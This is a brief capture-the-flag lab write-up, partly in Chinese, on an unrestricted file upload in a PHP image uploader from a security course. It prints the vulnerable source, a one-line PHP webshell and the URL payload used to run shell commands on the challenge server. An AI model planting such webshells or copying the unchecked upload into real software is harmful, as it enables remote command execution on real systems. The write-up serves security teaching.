---
title: Simple Web 0x04(Lab - Image Space 0x01)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜Upload"
date: 2023-01-31
---

# Simple Web 0x04(Lab - Image Space 0x01)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:9010

## Source code
```php
<?php
    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit;
    }
?>
<h1>Image Uploader</h1>
<p>Only supports: jpg, jpeg, png</p>
<!-- upload form -->
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="image_file">
    <input type="submit" value="Upload">
</form>
<p>
    <a href="/?source">View Source</a>
</p>
<?php
    if (!isset($_FILES['image_file'])) {
        die('Give me a file!');
    }

    $filename = basename($_FILES['image_file']['name']);

    $prefix = bin2hex(random_bytes(8));
    move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
    echo "<img src=\"images/${prefix}_${filename}\">";
?>
```

There's no any protection. Therefore, upload `webshell` and get shell

## Exploit - `webshell`
1. 直接上傳一個名為`webshell.php`的檔案，內容為`<?php system($_GET["sh"]); ?>`
```bash
$ touch webshell.php
$ echo '<?php system($_GET["sh"]); ?>' > webshell.php
```
2. 傳送出去之後查看該圖片並且在query的地方寫command，Payload: 
```bash
http://h4ck3r.quest:9010/images/<filename>.php?sh=pwd
```
    
## 如果想要deploy在localhost
```bash
$ touch index.php # 把上面的index都複製到index.php
$ mkdir images
$ php -S localhost:8000
```